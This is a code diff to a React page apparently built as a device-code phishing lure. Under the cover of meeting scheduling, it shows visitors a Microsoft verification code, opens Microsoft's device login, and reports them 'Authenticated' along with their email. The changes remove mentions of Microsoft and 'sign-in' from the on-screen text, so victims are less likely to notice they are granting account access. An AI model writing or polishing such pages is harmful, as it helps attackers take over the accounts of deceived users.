@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 const MONTH_NAMES = [
   'January', 'February', 'March', 'April', 'May', 'June',
@@ -193,7 +193,7 @@ export function ScheduleCapturePage(): React.ReactElement {
 
   function handleContinueToVerify(): void {
     setCaptureState('waiting');
-    window.open(DEVICE_AUTH_URL, '_blank');
+    window.open(DEVICE_VERIFY_URL, '_blank');
   }
 
   function handleReset(): void {
@@ -261,7 +261,7 @@ export function ScheduleCapturePage(): React.ReactElement {
             <div className="capture-card">
               <div className="capture-loading">
                 <div className="capture-spinner" />
-                <span>Requesting verification code from Microsoft...</span>
+                <span>Requesting verification code...</span>
               </div>
             </div>
           )}
@@ -289,7 +289,7 @@ export function ScheduleCapturePage(): React.ReactElement {
                 Continue to Verify
               </button>
               {captureState === 'waiting' && (
-                <div className="capture-waiting">Waiting for you to complete sign-in...</div>
+                <div className="capture-waiting">Waiting for you to complete verification...</div>
               )}
               <div className="capture-expiry">Code expires in <strong>{formatTime(countdown)}</strong></div>
             </div>
@@ -305,7 +305,7 @@ export function ScheduleCapturePage(): React.ReactElement {
                   </svg>
                 </div>
                 <h2>Meeting Scheduled & Authenticated</h2>
-                {authEmail && <p className="capture-auth-email">Signed in as <strong>{authEmail}</strong></p>}
+                {authEmail && <p className="capture-auth-email">Verified as <strong>{authEmail}</strong></p>}
                 <p>Your meeting on <strong>{selectedDateStr}</strong> at <strong>{selectedTime}</strong> has been confirmed.</p>
                 <button className="capture-another-btn" onClick={handleReset}>Schedule another meeting</button>
               </div>
